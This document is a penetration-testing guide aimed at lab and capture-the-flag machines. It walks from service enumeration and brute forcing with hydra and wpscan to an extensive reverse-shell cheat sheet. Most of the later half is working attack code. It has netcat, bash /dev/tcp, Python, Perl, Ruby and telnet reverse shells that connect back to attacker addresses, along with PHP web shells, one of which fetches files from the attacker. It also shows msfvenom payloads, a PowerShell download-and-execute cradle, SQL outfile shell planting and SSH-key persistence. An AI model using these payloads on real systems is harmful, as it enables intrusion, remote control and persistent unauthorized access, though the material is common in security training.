# From Nothing to a Unprivileged Shell

At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (e.g. certain cms's)

## searchsploit

Exploit Database Archive Search

First of all, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VMs which could be exploited to extract information from the system.

```none
root@kali:~# nmap -sV -A 172.16.73.128
**********Trimmed**************
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version: 
|_  ERROR: Failed to get host information from server
**********Trimmed**************
```

If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the matching version.

```none
root@kali:~# searchsploit webmin
**********Trimmed**************
Description                                                                            Path
----------------------------------------------------------------------------------------------------------------
Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit                   | /multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)            | /multiple/remote/2017.pl
Webmin 1.x HTML Email Command Execution Vulnerability                                | /cgi/webapps/24574.txt
**********Trimmed**************
```

Once we have figured out which exploit to check we can read about it by using the file-number. For example: 1997, 2017, 24574 in the above case.

```none
searchsploit -x 24674
```

Searchsploit provides an option to read the nmap XML file and suggest vulnerabilities (Requires nmap -sV -x xmlfile).

```none
searchsploit
    --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml).
        Use "-v" (verbose) to try even more combinations
```

Tip

If we don't manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let's say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it's valid for lower versions too.

## SecLists.Org Security Mailing List Archive

There will be some days, when you won't find vulnerabilities with searchsploit. In this case, we should also check the [SecLists.Org Security Mailing List Archive](http://seclists.org/), if someone has reported any bug(s) for that particular software that we can exploit.

## Google-Vulns

It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your search term. For example. Let's say, you are stuck in a docker or on a specific cms search for docker ctf or <cms_name> ctf/ github etc.

## Webservices

If a webserver is running on a machine, we can start with running

### whatweb

Utilize whatweb to find what software stack a server is running.

```none
whatweb www.example.com
http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], Country[INDIA][IN], Email[infosecurity@zmail.example.com], Google-Analytics[Universal][UA-6386XXXXX-2], HTML5, HTTPServer[Example Webserver], HttpOnly[ASP.NET_SessionId,CMSPreferredCulture,citrix_ns_id], IP[XXX.XX.XX.208], JQuery[1.11.0], Kentico-CMS, Modernizr, Script[text/javascript], Title[Welcome to Example Website ][Title element contains newline(s)!], UncommonHeaders[cteonnt-length,x-cache-control-orig,x-expires-orig], X-Frame-Options[SAMEORIGIN], X-UA-Compatible[IE=9,IE=edge]
```

### nikto

nikto - Scans a web server for known vulnerabilities.

It will examine a web server to find potential problems and security vulnerabilities, including:

- Server and software misconfigurations
- Default files and programs
- Insecure files and programs
- Outdated servers and programs

### dirb, wfuzz, dirbuster

Furthermore, we can run the following programs to find any hidden directories.

- [DIRB](https://tools.kali.org/web-applications/dirb) is a Web Content Scanner. It looks for existing (and/ or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.
- [wfuzz](https://tools.kali.org/web-applications/wfuzz) - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let's say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what's the size of the normal image and hide that particular response with wfuzz.
- [Dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.
- [gobuster](https://github.com/OJ/gobuster) : Gobuster is a tool used to brute-force URIs (directories and files) in web sites and DNS subdomains (with wildcard support). (golang can be installed using apt-get).

- [dirsearch](https://github.com/maurosoria/dirsearch) : Dirsearch is a command-line tool designed to brute force directories and files in webservers.

- [ffuf](https://github.com/ffuf/ffuf) : ffuf is a great tool used for fuzzing. Ffuf is used for fuzzing Get and Post data but can also be used for finding hidden files, directories or subdomains

Tip

Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it's doesn't find anything, it's better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn't work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)

Tip

If using the dirb/ wfuzz wordlist doesn't result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories. Also, it sometimes make sense to dirb/wfuzz the IPAddress instead of the hostname like filesrv.example.com (Maybe found by automatic redirect)

Tip

It's important to know that dirb shows the directories found based on the response code, so if a web-application shows 404 status code instead of 200, dirbuster would miss it. In that case, wfuzz or gobuster or Burpsuite would help as they check for response length too.

### BurpSuite Spider

There will be some cases when dirb/ dirbuster doesn't find anything. This happened with us on a Node.js web application. Burpsuite's spider helped in finding extra-pages which contained the credentials.

### Parameter Fuzz?

Sometimes, we might have a scenario where we have a website which might be protected by a WAF.

```none
http://IP/example
```

Now, this "/example" might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest part is that we can only find the GET parameters by fuzzing "/example" if you get some errors from the application, so the goal is to fuzz using a special char as the parameter's value, something like: "/example?FUZZ=' "

```none
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "User-Agent: SomethingNotObivousforWAF" "http://IP/example?FUZZ='"
```

The other things which we may try is putting a valid command such as 'ls, test' so it becomes FUZZ=ls or FUZZ=test

### PUT Method

Sometimes, it is also a good idea to check the various HTTP verbs that are available such as GET, PUT, DELETE, etc. This can be done by making an **OPTIONS** request.

Curl can be used to check the available options (supported http verbs):

```none
curl -X OPTIONS -v http://192.168.126.129/test/
Trying 192.168.126.129…
Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
> OPTIONS /test/ HTTP/1.1
> Host: 192.168.126.129
> User-Agent: curl/7.47.0
> Accept: /
>
< HTTP/1.1 200 OK
< DAV: 1,2
< MS-Author-Via: DAV
< Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
< Allow: OPTIONS, GET, HEAD, POST
< Content-Length: 0
< Date: Fri, 29 Apr 2016 09:41:19 GMT
< Server: lighttpd/1.4.28
<
* Connection #0 to host 192.168.126.129 left intact
```

The PUT method allows you to upload a file which can help us to get a shell on the machine. There are multiple methods available for uploading a file with the PUT method mentioned on [Detecting and exploiting the HTTP Put Method](http://www.smeegesec.com/2014/10/detecting-and-exploiting-http-put-method.html)

A few are:

- Nmap:

    ```none
    nmap -p 80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php'
    ```

- curl:

    ```none
    curl --upload-file test.txt -v --url http://192.168.126.129/test/test.txt
    ```

  or

    ```none
    curl -X PUT -d '
    curl -i -X PUT -H "Content-Type: application/xml; charset=utf-8" -d @"/tmp/some-file.xml" http://IPAddress/newpage
    curl -X PUT -d "text or data to put" http://IPAddress/destination_page
    curl -i -H "Accept: application/json" -X PUT -d "text or data to put" http://IPAddress/new_page
    ```

### Wordpress

When faced with a website that makes use of the wordpress CMS one can run wpscan. Make sure you run \--enumerate u for enumerating usernames because by default wpscan doesn't run it. Also, scan for plugins

Note: wpscan by default scan username id from 1 to 10. We may need to manually set if we want more usernames to be enumerated.

```none
wpsscan
    --url       | -u <target url>       The WordPress URL/domain to scan.
    --force     | -f                    Forces WPScan to not check if the remote site is running WordPress.
    --enumerate | -e [option(s)]        Enumeration.
    option :
        u        usernames from id 1 to 10
        u[10-20] usernames from id 10 to 20 (you must write [] chars)
        p        plugins
        vp       only vulnerable plugins
        ap       all plugins (can take a long time)
        tt       timthumbs (vulnerability scanner)
        t        themes
        vt       only vulnerable themes
        at       all themes (can take a long time)
        Multiple values are allowed : "-e tt,p" will enumerate timthumbs and plugins

        If no option is supplied, the default is "vt,tt,u,vp"
        (only vulnerable themes, timthumbs, usernames from id 1 to 10, only vulnerable plugins)
```

We can also use wpscan to bruteforce passwords for a given username

```none
wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
```

**Tips**

- wpscan scans the themes, plugins by passive scanning, if we are not finding anything, it might be good idea to do scanning with all plugins (ap) and all themes (at). Sometimes, plugin may fake their version, so probably, good idea to readme and check for vulns.
- If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance > Editor > Edit 404 Template.
- The configuration of worpdress is normally speaking stored in **wp-config.php**. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page.
- If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.
- Got wordpress credentials, maybe utilize [WPTerm](https://wordpress.org/plugins/wpterm/) an xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.
- If there's a custom plugin created, it would probably be in the location

    ```none
    http://IP/wp-content/plugins/custompluginname
    ```

```none
.. Todo:: what is the (standard) format of a wp hash and where in the database is it stored? Elborate more on wp scanning and vulnerabilities?
```

### Names? Possible Usernames & Passwords?

Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written [namemash.py](https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py) which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.

If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.

- Using metasploit smtp\_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp\_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.
- Using VRFY command:
- Using RCPT TO command:

Once we have identified a pattern of username creation, we may modify namemash.py to generate usernames and check if they exist or not.

### Brute forcing: hydra

Hydra can be used to brute force login web pages

```none
-l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE  (userlist)
-p PASS  or -P FILE try password PASS, or load several passwords from FILE  (passwordlist)
-U        service module usage details
-e nsr additional checks, "n" for null password, "s" try login as pass, "r" try the reverse login as pass
```

hydra http-post-form:

```none
hydra -U http-post-form
```

**Help for module http-post-form**

Module http-post-form requires the page and the parameters for the web form.

The parameters take three ":" separated values, plus optional values.

```none
Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
```

- First is the page on the server to send a GET or POST request to (URL).
- Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the "^USER^" and "^PASS^" placeholders (FORM PARAMETERS)
- Third is the string that it checks for an *invalid* login (by default). Invalid condition login check can be preceded by "F=", successful condition login check must be preceded by "S=". This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!
- The following parameters are optional:
  C=/page/uri          to define a different page to gather initial cookies from
  (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!

  - Note:
    - 'h' will add the user-defined header at the end regardless it's already being sent by Hydra or not.
    - 'H' will replace the value of that header if it exists, by the one supplied by the user, or add the header at the end

  - Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.

Examples:

```none
"/login.php:user=^USER^&pass=^PASS^:incorrect"
"/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
"/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
"/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^"
"/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```

```none
.. Todo:: Add a program/binary that an easier syntax, ncrack maybe? Elaborate on the examples, eg. what they will do once executed?
```

## Reverse Shells

Once we have figured out some vulnerability or misconfiguration in a running service which allows us to make a connection back to our attack machine, we would like to set up a reverse shell. This can be done through version methods e.g. by using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. The section below has been mostly adapted from [PentestMonkey Reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  and [Reverse Shell Cheat sheet from HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/) and more.

### netcat (nc)

TCP Mode

- with the -e option

  ```none
  nc -e /bin/sh 10.1.1.1 4444
  ```

- without -e option

  ```none
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
  ```

Tip

f in this case is a file name, if you want to have more then one reverse shell with this method you will have to use another letter (a ... z) then the one you used intially.

UDP Mode

Just use the UDP Mode (-u)

```none
nc -h
[v1.10-41.1]
connect to somewhere:   nc [-options] hostname port[s] [ports] ... 
listen for inbound: nc -l -p port [-options] [hostname] [port]
options:
    -l  listen mode, for inbound connects
    -n  numeric-only IP addresses, no DNS
    -p port local port number
    -u  UDP mode
```

### PHP

- **PHP Web Shell**

  This is a kind of Web shell and not a reverse shell.

  We can create a new file say (shell.php) on the server containing

  ```none
  <?php system($_GET["cmd"]); ?>
  ```

  or

  ```none
  <?php echo shell_exec($_GET["cmd"]); ?>
  ```

  or

  ```none
  <? passthru($_GET["cmd"]); ?>
  ```

  which can then be accessed by

  ```none
  http://IP/shell.php?cmd=id
  ```

  If there's a webpage which accepts phpcode to be executed, we can use curl to urlencode the payload and run it.

  ```none
  curl -G -s http://10.X.X.X/somepage.php?data= --data-urlencode "html=<?php passthru('ls -lah'); ?>" -b "somecookie=somevalue" | sed '/<html>/,/<\/html>/d'
  
  -G When used, this option will make all data specified with -d, --data, --data-binary or --data-urlencode to be used in an HTTP GET request instead of the POST request that otherwise would be used. The data will be appended to the URL with a  '?' separator.
  -data-urlencode <data> (HTTP) Posts data, similar to the other -d, --data options with the exception that this performs URL-encoding. 
  -b, --cookie <data> (HTTP) Passes the data to the HTTP server in the Cookie header. It is supposedly the data previously received from the server in a "Set-Cookie:" line.  The data should be in the format "NAME1=VALUE1; NAME2=VALUE2".
  ```

  The sed command in the end

  ```none
  sed '/<html>/,/<\/html>/d'
  ```

  deletes the content between <html> and </html> tag.

  If you also want to provide upload functionality (imagine, if we need to upload nc64.exe on Windows or other-binaries on linux), we can put the below code in the php file

  ```none
  <?php 
   if (isset($_REQUEST['fupload'])) {
    file_put_contents($_REQUEST['fupload'], file_get_contents("http://yourIP/" . $_REQUEST['fupload']));
   };
   if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   }
   ?>
  ```

  The above can be accessed by

  ```none
  http://IP/shell.php?fupload=filename_on_your_webserver
  ```

- **PHP Meterpreter**

  We can create a php meterpreter shell, run a exploit handler on msf, upload the payload on the server and wait for the connection.

  ```none
  msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f raw -o /tmp/payload.php
  ```

  We can set the multi-handler in metasploit by

  ```none
  use exploit/multi/handler
  set payload php/meterpreter/reverse_tcp
  set LHOST yourIP
  run
  ```

- **PHP Reverse Shell**

  The code below assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4 or 5 or 6.

  ```none
  php -r '$sock=fsockopen("192.168.56.101",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
  ```

  The above can be connected to by listening on port 1337 by using nc.

### Weevely

Weevely also generates a webshell

```none
weevely generate password /tmp/payload.php
```

which can then be called by

```none
weevely http://192.168.1.2/location_of_payload password
```

However, it was not as useful as php meterpreter or a reverse shell.

```none
.. Todo:: Elobrate -> why wasn't it useful? iirc (really not sure) if you don't provide a password it will ask for it
```

### Ruby

```none
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Perl

```none
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Python

TCP

```none
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

UDP

```none
import os,pty,socket;s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect(("10.10.14.17", 4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE",'/dev/null');pty.spawn("/bin/sh");s.close()
```

### Java

```none
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### JSP

```none
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f war > runme.war
```

### Bash /dev/tcp

If a server (attacker machine) is listening on a port:

```none
nc -lvp port
```

then we can use the below to connect

Method 1:

```none
/bin/bash -i >&/dev/tcp/IP/Port 0>&1
```

Method 2:

```none
exec 5<>/dev/tcp/IP/80
cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

while read line 0<&5; do $line 2>&5 >&5; done
```

Method 3:

```none
0<&196;exec 196<>/dev/tcp/IP/Port; sh <&196 >&196 2>&196

-- We may execute the above using bash -c "Aboveline "
```

[Information about Bash Built-in /dev/tcp File (TCP/IP)](http://www.linuxjournal.com/content/more-using-bashs-built-devtcp-file-tcpip)

The following script fetches the front page from Google:

```none
exec 3<>/dev/tcp/www.google.com/80
echo -e "GET / HTTP/1.1\r\nhost: http://www.google.com\r\nConnection: close\r\n\r\n" >&3
cat <&3
```

- The first line causes file descriptor 3 to be opened for reading and writing on the specified TCP/IP socket. This is a special form of the exec statement. From the bash man page:

  ```none
  exec [-cl] [-a name] [command [arguments]]
  ```

  If command is not specified, any redirections take effect in the current shell, and the return status is 0. So using exec without a command is a way to open files in the current shell.

- Second line:  After the socket is open we send our HTTP request out the socket with the echo ... >&3 command. The request consists of:

  ```none
  GET / HTTP/1.1
  host: http://www.google.com
  Connection: close
  ```

  Each line is followed by a carriage-return and newline, and all the headers are followed by a blank line to signal the end of the request (this is all standard HTTP stuff).

- Third line: Next we read the response out of the socket using cat <&3, which reads the response and prints it out.

### Telnet Reverse Shell

```none
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

```none
.. Todo:: explain the example above
```

### XTerm

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the victim server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

```none
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

```none
Xnest :1 -listen tcp
```

You’ll need to authorize the target to connect to you (command also run on your host):

```none
xhost +targetip
```

### Lynx

Obtain an interactive shell through lynx: It is possible to obtain an interactive shell via special LYNXDOWNLOAD URLs.
This is a big security hole for sites that use lynx "guest accounts" and other public services. More details [LynxShell](http://insecure.org/sploits/lynx.download.html)

When you start up a lynx client session, you can hit "g" (for goto) and then enter the following URL:

```none
URL to open: LYNXDOWNLOAD://Method=-1/File=/dev/null;/bin/sh;/SugFile=/dev/null
```

### MYSQL

- If we have MYSQL Shell via sqlmap or phpmyadmin, we can use mysql outfile/ dumpfile function to upload a shell.

  ```none
  echo -n "<?php phpinfo(); ?>" | xxd -ps 3c3f70687020706870696e666f28293b203f3e

  select 0x3c3f70687020706870696e666f28293b203f3e into outfile "/var/www/html/blogblog/wp-content/uploads/phpinfo.php"
  ```

  or

  ```none
  SELECT "<?php passthru($_GET['cmd']); ?>" into dumpfile '/var/www/html/shell.php';
  ```

- If you have sql-shell from sqlmap/ phpmyadmin, we can read files by using the load_file function.

  ```none
  select load_file('/etc/passwd');
  ```

### Reverse Shell from Windows

If there's a way, we can execute code from windows, we may try

- Uploading ncat and executing it
- Powershell Empire/ Metasploit Web-Delivery Method
- Invoke-Shellcode (from powersploit)

  ```none
  Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://YourIPAddress:8000/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost YourIPAddress -Lport 4444 -Force"
  ```

```none
.. Todo:: add Nishang?
```

### MSF Meterpreter ELF

```none
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.XX.110 LPORT=4446
```

### Metasploit MSFVenom

Ever wondered from where the above shells came from? Maybe try msfvenom and grep for cmd/unix

```none
msfvenom -l payloads | grep "cmd/unix"
**snip**
    cmd/unix/bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK
    cmd/unix/bind_inetd                                 Listen for a connection and spawn a command shell (persistent)
    cmd/unix/bind_lua                                   Listen for a connection and spawn a command shell via Lua
    cmd/unix/bind_netcat                                Listen for a connection and spawn a command shell via netcat
    cmd/unix/bind_perl                                  Listen for a connection and spawn a command shell via perl
    cmd/unix/interact                                   Interacts with a shell on an established socket connection
    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections
    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK
    cmd/unix/reverse_python                             Connect back and create a command shell via Python
    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.
    cmd/unix/reverse_r                                  Connect back and create a command shell via R
    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby
**snip**
```

Now, try to check the payload

```none
msfvenom -p cmd/unix/bind_netcat
Payload size: 105 bytes
mkfifo /tmp/cdniov; (nc -l -p 4444 ||nc -l 4444)0</tmp/cdniov | /bin/sh >/tmp/cdniov 2>&1; rm /tmp/cdniov
```

## Spawning a TTY Shell

Once we have reverse shell, we need a full TTY session by using either Python, sh, perl, ruby, lua, IRB. [Spawning a TTY Shell](https://netsec.ws/?p=337) and [Post-Exploitation Without A TTY](http://pentestmonkey.net/blog/post-exploitation-without-a-tty) have provided multiple ways to get a tty shell

### Python

```none
python -c 'import pty; pty.spawn("/bin/sh")'
```

or

```none
python -c 'import pty; pty.spawn("/bin/bash")'
```

```none
python -c 'import os; os.system("/bin/bash")'
```

### sh

```none
/bin/sh -i
```

### Perl

```none
perl -e 'exec "/bin/sh";'
```

```none
perl: exec "/bin/sh";
```

### Ruby

```none
ruby: exec "/bin/sh"
```

### Lua

```none
lua: os.execute('/bin/sh')
```

### IRB

(From within IRB)

```none
exec "/bin/sh"
```

### VI

(From within vi)

```none
:!bash
```

(From within vi)

```none
:set shell=/bin/bash:shell
```

Also, if we execute

```none
vi ;/bin/bash
```

Once, we exit vi, we would get shell. Helpful in scenarios where the user is asked to input which file to open.

### Nmap

(From within nmap)

```none
!sh
```

### Expect

Using “Expect” To Get A TTY

```none
$ cat sh.exp
# Spawn a shell, then allow the user to interact with it.
#!/usr/bin/expect
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
```

### Sneaky Stealthy SU in (Web) Shells

Let's say we have a webshell on the server (probably, we would be logged in as a apache user), however, if we have credentials of another user, and we want to login we need a tty shell. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell.

**Example**

Webshell like

```none
http://IP/shell.php?cmd=id
```

If we try

```none
echo password | su -c whoami
```

Probably will get

```none
standard in must be a tty
```

The su command would work from a terminal, however, would not take in raw stuff via the shell's Standard Input. We can use a shell terminal trick that relies on Python to turn our non-terminal shell into a terminal shell

```none
(sleep 1; echo password) | python -c "import pty; pty.spawn(['/bin/su','-c','whoami']);"
root
```

The above has been referenced from SANS [Sneaky Stealthy SU in (Web) Shells](https://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells#)

## Spawning a Fully Interactive TTYs Shell

[Ronnie Flathers](https://twitter.com/ropnop) has already written a great blog on [Upgrading simple shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) Hence, almost everything is taken from that blog post and kept here for completion.

Many times, we will not get a fully interactive shell therefore it will/ have:

- Difficult to use the text editors like vim
- No tab-complete
- No up arrow history
- No job control

### Socat

Socat can be used to pass full TTY's over TCP connections.

On Kali-Machine (Attackers - Probably yours)

```none
socat file:`tty`,raw,echo=0 tcp-listen:4444 
```

On Victim (launch):

```none
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
```

If socat isn't installed, download standalone binaries that can be downloaded from [static binaries](https://github.com/andrew-d/static-binaries)

Download the correct binary architecture of socat to a writable directory, chmod it, execute

### stty

Use the methods mentioned in :ref:`spawning-a-tty-shell`

Once bash is running in the PTY, background the shell with Ctrl-Z
While the shell is in the background, examine the current terminal and STTY info so we can force the connected shell to match it

```none
echo $TERM
xterm-256color
```

```none
stty -a
speed 38400 baud; rows 59; columns 264; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V;   discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

The information needed is the TERM type ("xterm-256color") and the size of the current TTY ("rows 38; columns 116")

With the shell still backgrounded, set the current STTY to type raw and tell it to echo the input characters with the following command:

```none
stty raw -echo 
```

With a raw stty, input/ output will look weird and you won't see the next commands, but as you type they are being processed.

Next foreground the shell with fg. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with reset.

After the reset the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)

```none
$export SHELL=bash
$export TERM=xterm256-color
$stty rows 38 columns 116
```

The end result is a fully interactive TTY with all the features we'd expect (tab-complete, history, job control, etc) all over a netcat connection

### ssh-key

If we have some user shell or access, probably it would be a good idea to generate a new ssh private-public key pair using ssh-keygen

```none
ssh-keygen 
Generating public/private rsa key pair.
Enter file in which to save the key (/home/bitvijays/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/bitvijays/.ssh/id_rsa.
Your public key has been saved in /home/bitvijays/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:JbdAhAIPl8qm/kCANJcpggeVoZqWnFRvVbxu2u9zc5U bitvijays@Kali-Home
The key's randomart image is:
+---[RSA 2048]----+
|o==*+. +=.       |
|=o**+ o. .       |
|=+...+  o +      |
|=.* .    * .     |
|oO      S .     .|
|+        o     E.|
|..      +       .|
| ..    . . . o . |
|  ..      ooo o  |
+----[SHA256]-----+
```

Copy/ Append the public part to /home/user/.ssh/authorized_keys

```none
cat /home/bitvijays/.ssh/id_rsa.pub 

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+tbCpnhU5qQm6typWI52FCin6NDYP0hmQFfag2kDwMDIS0j1ke/kuxfqfQKlbva9eo6IUaCrjIuAqbsZTsVjyFfjzo/hDKycR1M5/115Jx4q4v48a7BNnuUqi +qzUFjldFzfuTp6XM1n+Y1B6tQJJc9WruOFUNK2EX6pmOIkJ8QPTvMXYaxwol84MRb89V9vHCbfDrbWFhoA6hzeQVtI01ThMpQQqGv5LS+rI0GVlZnT8cUye0uiGZW7ek9DdcTEDtMUv1Y99zivk4FJmQWLzxplP5dUJ1NH5rm6YBH8CoQHLextWc36Ih18xsyzW8qK4Bfl4sOtESHT5/3PlkQHN bitvijays@Kali-Home" >> /home/user/.ssh/authorized_keys
```

Now, ssh to the box using that user.

```none
ssh user@hostname -i id_rsa
```

## Restricted Shell

Sometimes, after getting a shell, we figure out that we are in restricted shell. The below has been taken from [Escaping Restricted Linux Shells](https://pen-testing.sans.org/blog/pen-testing/2012/06/06/escaping-restricted-linux-shells), [Escape from SHELLcatraz](https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)

### Definition

It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:

- Using the 'cd' command to change directories.
- Setting or un-setting certain environment variables (i.e. SHELL, PATH, etc...).
- Specifying command names that contain slashes.
- Specifying a filename containing a slash as an argument to the '.' built-in command.
- Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
- Importing function definitions from the shell environment at startup.
- Parsing the value of SHELLOPTS from the shell environment at startup.
- Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
- Using the 'exec' built-in to replace the shell with another command.
- Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
- Using the 'enable' built-in command to enable disabled shell built-ins.
